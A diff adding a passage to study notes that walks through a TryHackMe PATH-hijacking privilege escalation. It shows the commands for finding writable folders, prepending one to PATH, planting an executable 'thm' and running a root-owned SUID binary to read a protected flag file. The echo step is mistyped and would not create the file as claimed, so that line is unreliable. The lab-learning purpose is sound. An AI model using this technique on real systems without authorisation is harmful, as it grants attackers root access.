@@ -285,6 +285,40 @@ Creating this command is fairly easy by copying /bin/bash as “thm” under the
 > ls -l
 We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.
 
+-----
+In order to add more context to the use of the PATH vulnerability in order to escalate privileges it pays to review the steps taken to answer the challenge questions in this Task (see: https://medium.com/@cyberjunkiebynight/linux-privesc-tryhackme-write-up-a284b97d5f4):
+* The hacker starts off with access to the Karen account.
+* The goal is to read the flag6.txt file located in the /home/matt folder - a folder Karen does not have access to
+* The hacker searches for writable folders:
+> find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | sort -u
+and finds that the following folder is writable: /home/murdoch
+* A check of the /home/murdoch folder shows a python script with an undefined parameter (thm.py) and the compiled version of that script (test) with the SUID bit set (granting root privileges to this executable)
+> ls -l
+-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
+-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
+> cat thm.py
+/usr/bin/python3
+
+import os
+import sys
+
+try: 
+	os.system("thm")
+except:
+	sys.exit()
+* The hacker adds /home/murdoch to the PATH of the user Karen:
+> export PATH=/home/murdoch:$PATH
+* A check on PATH shows that it is now there:
+> echo $PATH
+/home/murdoch:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+* the hacker creates a file in /home/murdoch (which remember is writable) called thm with a script that will read the flag6.txt file if it can run with root privilege:
+> echo "cat /home/matt/flag6.txt > thm"
+* the hacker makes the file executable
+> chmod 777 thm
+* the hacker runs the executable called: test
+> ./test
+* the text of /home/matt/flag6.txt is printed on the terminal screen
+This happens because when the test executable runs it looks for the thm parameter that is in its script. It checks $PATH and since the /home/murdoch file is now listed there it looks in that folder for thm. It finds the thm file that the hacker created and runs the script it finds in that file. That script concatanetes the /home/matt/flag6.txt file. Now, that file is not normally readable by the user Karen; however, the test executable had the SUID set so it runs with root privileges and therefore can use the script in thm to concatenate the /home/matt/flag6.txt file
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 [From: https://tryhackme.com/room/vulnversity ; Task 5 - Privilege Escalation]
 "In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
